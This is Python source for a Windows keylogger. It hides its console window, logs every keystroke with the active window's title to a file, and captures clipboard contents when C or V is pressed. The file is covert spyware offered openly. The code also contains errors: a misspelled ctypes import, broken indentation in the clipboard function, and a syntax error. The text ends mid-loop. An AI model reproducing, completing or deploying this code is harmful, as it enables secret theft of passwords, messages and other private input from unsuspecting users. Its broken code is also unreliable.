import cytpes  # For interfacing with C functions
import logging  # For logging with keystrokes on disk

kernel32 = ctypes.windll.kernel32  # Access functions from kernel32.dll
user32 = ctypes.windll.user32      # Access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)  # Hide console


# Function to grab the current window and its title
# So we know that program the user is typing
def get_current_window():

    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLength
    GetWindowText = user32.GetWindowText

    hwnd = GetForegroundWindow()  # Get handle to Foreground Window
    # Get length of the window text in titlebar, passing handle as argument
    length = GetWindowTextLength(hwnd)
    # Create buffer to store the window title string
    buff = ctypes.create_unicode_buffer(length + 1)

    # Get window title and store in buff
    GetWindowText(hwnd, buff, length + 1)

    return buff.value  # Return the value of buff


# Function to capture contents of clipboard. We use pointers with ctypes
def get_clipboard():

    CF_TEXT = 1  # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        # If CF_TEXT is available
        if IsClipboardFormatAvailable(CF_TEXT):
            # Get handle to data in clipboard
        data = GetClipboardData(CF_TEXT)
        # Get pointer to memory location where data is located
        data_locked = kernel32.GlobalLock(data)
        # Get a char * pointer to the location of data_locked
        text = ctypes.c_char_p(data locked)
        value = text.value  # Dump the content in value
        # Decrement the lock count
        kernel32.GlobalUnlock(data_locked)
        return value.decode('utf-8')  # Return the clipboard content

    finally:
        CloseClipboard()  # Close the clipboard


# Function for monitor and log keystrokes
# Requires two arguments.
def get_keystrokes(log_dir, log_name):

    # Logger
    logging.basicConfig(filename=(log_dir + "\\" + log_name),
                        level=logging.DEBUG, format='%(message)s')
    # WinAPI function that determines if key is pressed up or down
    GetAsyncKeyState = user32.GetAsyncKeyState
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift',
                    0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock',
                    0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = []  # Stores the characters pressed

    while True:
        # If the content of current_window isn't the currently opened window
        if current_window != get_current_window():
            current_window = get_current_window()  # Get the the window title in current_window
            # Write the current window title in the log file
            logging.info(str(current_window).encode('utf-8'))

        # 256 ASCII characters. We only use 128 though
        for i in range(1, 256):
            # If a key is pressed and matches an ASCII character
            if GetAsyncKeyState(i) & 1:
                if i in special_keys:  # If special key, log as such
                    logging.info("<{}>".format(special_keys[i]))
                elif i == 0x0d:  # If <ENTER>, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                # If characters 'c' or 'v' are pressed, get clipboard data
                # This is necessary incase they press Ctrl+C/Ctrl+V instead of using keyboard shortcuts
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76:
                    clipboard_data = get_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 <= i <= 0x5a:  # If alphanumeric character, append to line
                    line.append(chr(i))
